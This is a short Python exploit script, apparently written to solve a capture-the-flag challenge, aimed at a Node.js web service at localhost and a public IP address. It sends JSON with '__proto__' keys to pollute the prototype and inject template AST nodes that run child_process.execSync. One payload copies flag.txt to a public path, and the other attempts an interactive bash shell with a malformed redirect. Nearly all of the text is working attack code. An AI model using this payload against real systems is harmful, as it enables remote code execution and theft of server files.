import requests

TARGET_URL = 'http://localhost:1337'
TARGET_URL = 'http://103.191.240.170:3022'

# make pollution
# r = requests.post(TARGET_URL+'/api/submit', json={
#     "song.name": "Diamonds",
#     "__proto__.type": "Program",
#     "__proto__.body": [{
#         "type": "MustacheStatement",
#         "path": 0,
#         "params": [{
#             "type": "NumberLiteral",
#             "value": "process.mainModule.require('child_process').execSync(`cat flag.txt > /phototype/public/out`)"
#         }],
#         "loc": {
#             "start": 0,
#             "end": 0
#         }
#     }]
# })

r = requests.post(TARGET_URL + '/api/submit', json = {
    "song.name": "Diamonds",
    "__proto__.type": "Program",
    "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& ls'`)"
    }
})

print(r.status_code)
print(r.text)

# print(requests.get(TARGET_URL+'/static/out').text)
# 